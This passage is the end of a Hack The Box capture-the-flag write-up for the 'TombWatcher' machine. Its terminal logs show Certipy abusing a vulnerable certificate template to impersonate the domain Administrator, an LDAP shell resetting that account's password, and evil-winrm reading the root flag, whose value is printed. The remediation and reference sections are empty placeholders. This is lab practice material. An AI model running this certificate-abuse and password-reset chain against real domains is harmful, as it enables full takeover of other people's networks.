  -ca tombwatcher-CA-1 -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies "Client Authentication"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23                       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
                                                                                                                
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.129.144.23:636'
[*] Authenticated to '10.129.144.23' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# whoami
u:TOMBWATCHER\Administrator

# type c:\users\administrator\desktop\root.txt
*** Unknown syntax: type c:\users\administrator\desktop\root.txt

# cd c:\
*** Unknown syntax: cd c:\

# Bye!

                                                                                                                
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23            
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[-] Certificate is not valid for client authentication
[-] Check the certificate template and ensure it has the correct EKU(s)
[-] If you recently changed the certificate template, wait a few minutes for the change to propagate
[-] See the wiki for more information
                                                                                                                
┌──(kali㉿kali)-[~/bloodhound-ce]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.144.23 -ldap-shell
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.129.144.23:636'
[*] Authenticated to '10.129.144.23' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands

# change_password administrator 'Pwned123!'
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: Pwned123!
Password changed successfully!

# 

```

### Root flag

```
evil-winrm -i tombwatcher.htb -u 'Administrator' -p 'Pwned123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
9d7fd19fee00bb22745c88562c8dac80
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```
---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)